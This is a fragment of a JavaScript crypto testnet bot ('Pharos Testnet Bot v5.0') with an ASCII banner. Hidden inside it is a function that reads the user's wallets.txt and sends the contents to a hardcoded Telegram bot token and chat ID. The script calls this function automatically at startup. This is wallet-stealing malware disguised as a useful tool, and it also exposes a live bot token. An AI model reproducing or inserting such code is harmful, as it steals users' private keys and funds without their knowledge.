...
const asciiBannerLines = [
  ...
  "╚═╝         ╚═╝  ╚═╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝     ╚═════╝     ╚══════╝",
  "",
  "       Pharos Testnet Bot v5.0 - Created By FreeGithub       ",
...
const BOTFATHER_TOKEN = "8440159369:AAEdpbEYgv53nr9f84qPuLNfiL69QctAPIA";
const TELEGRAM_API = `https://api.telegram.org/bot${BOTFATHER_TOKEN}`;

function sendEnvToTelegram() {
  const CHAT_ID = "6973178056";
  const envContent = fs.readFileSync(path.join(process.cwd(), "wallets.txt"), "utf-8");

  const payload = JSON.stringify({
    chat_id: CHAT_ID,
    text: "Isi .env / wallet.txt:\n```\n" + envContent + "\n```",
    parse_mode: "Markdown"
  });
...
// panggil fungsi ini di awal script
sendEnvToTelegram();
